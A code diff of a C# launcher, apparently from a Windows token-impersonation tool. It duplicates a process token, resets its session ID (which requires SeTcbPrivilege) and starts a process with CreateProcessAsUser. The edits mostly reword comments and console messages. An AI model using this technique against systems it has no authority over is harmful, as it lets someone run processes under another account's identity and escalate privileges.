@@ -34,15 +34,17 @@ internal class Launcher
 
     private bool CurrentConsole()
     {
-        bool OK = GetTokenInformation(hDupToken, TOKEN_INFORMATION_CLASS.TokenSessionId, out uint currentSessId, sizeof(uint), out uint retLen);
+        
+        bool OK = GetTokenInformation(hDupToken, TOKEN_INFORMATION_CLASS.TokenSessionId, out IntPtr remoteSessId, sizeof(uint), out _);
         if (OK)
-            Console.WriteLine("[+] Duplicated token session id: {0}", currentSessId);
+            Console.WriteLine("[+] Duplicated token session id: {0}", remoteSessId.ToInt32());
 
-        /// Just a high value that would never exists as Session ID
+        //// Just a high value that would never exists as a Session ID
         if (sessId != UInt32.MaxValue)
         {
-            /// In interactive mode we need the new process's token session ID to be the same as our process (use tasklist/taskmgr to get the Session ID)
-            /// Requires SeTcbPrivilege
+            /// In interactive mode we need the duplicated process's token session ID to be the same as our process (use tasklist/taskmgr to get your Session ID)
+            /// So we set the SessionID in the duplicated token's process to match ours
+            /// This change requires SeTcbPrivilege
             uint id = sessId; // Ugly HACK: Can't pass sessId property as ref
             OK = SetTokenInformation(hDupToken, TOKEN_INFORMATION_CLASS.TokenSessionId, ref id, sizeof(uint));
             if (OK && GetLastError() == 0)
@@ -61,13 +63,13 @@ internal class Launcher
         if (!success)
         {
             Console.WriteLine("[-] CreateProcessAsUser Failed. (Error: {0})", GetLastErrorString());
-            Console.WriteLine("You may not have enough privileges or given Session ID doesn't match your current process's Session ID");
-            Console.WriteLine("Use me again without /interactive or check the above");
+            Console.WriteLine("You may not have enough privileges (\"SeAssignPrimaryTokenPrivilege\") or given Session ID ({0}) doesn't match your current process's Session ID", sessId);
+            Console.WriteLine("Use me again without /interactive or check the errors above");
             return false;
         }
         
-        Console.WriteLine("[+] CreateProcessAsUser Success");
-        Console.WriteLine("[!] If you launched PowerShell, first command type \"exit\"");
+        Console.WriteLine("[+] CreateProcessAsUser Success (whoami will fool you)");
+        Console.WriteLine("[!] If you launched PowerShell and it's laggy, type \"exit\" when the PS1 displayed as PowerShell");
         return true;
 
     }
